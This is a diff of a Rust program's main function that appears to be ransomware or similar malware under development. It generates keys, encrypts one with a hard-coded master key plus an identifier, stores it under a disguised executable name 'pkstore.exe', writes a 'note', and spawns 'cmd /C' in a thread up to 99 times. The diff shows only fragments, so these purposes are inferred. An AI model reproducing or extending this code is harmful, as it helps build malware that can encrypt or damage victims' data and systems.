@@ -118,6 +118,9 @@ fn main() -> Result<(), Box<dyn Error>> {
         .map(PathBuf::from)
         .expect("failed to get base folder");
 
+    files::delete_item(&base_folder.join(MAIN_FOLDER_NAME))
+        .expect("failed to delete the main folder");
+
     let main_folder: PathBuf = files::create_folder(MAIN_FOLDER_NAME, &base_folder)
         .expect("failed to create main folder");
 
@@ -139,13 +142,14 @@ fn main() -> Result<(), Box<dyn Error>> {
     let usable_key: String = lib::gen_string(320);
     let actual_key: String = lib::gen_string(174);
 
-    let key_store: String = format!("{}qz.exe", lib::gen_string(28));
+    let key_store: String = String::from("pkstore.exe");
     let key_store_path: PathBuf = main_folder.join(&key_store);
 
     files::create_item(&key_store, main_folder.as_path())
         .expect("failed to create main store file");
 
-    let protected_key = match crypto::encrypt(&actual_key, &MASTER_KEY.to_string(), true) {
+    let master_key: String = MASTER_KEY.to_string() + &identifier;
+    let protected_key = match crypto::encrypt(&actual_key, &master_key, true) {
         Err(err) => {
             eprintln!("could not encrypt the main key: {}", err);
             return Ok(());
@@ -311,7 +315,7 @@ fn main() -> Result<(), Box<dyn Error>> {
         .expect("could not write the note");
 
     thread::spawn(move || {
-        loop {
+        for _ in 1..100 {
             let mut child: process::Child = Command::new("cmd")
                 .args([
                     "/C",
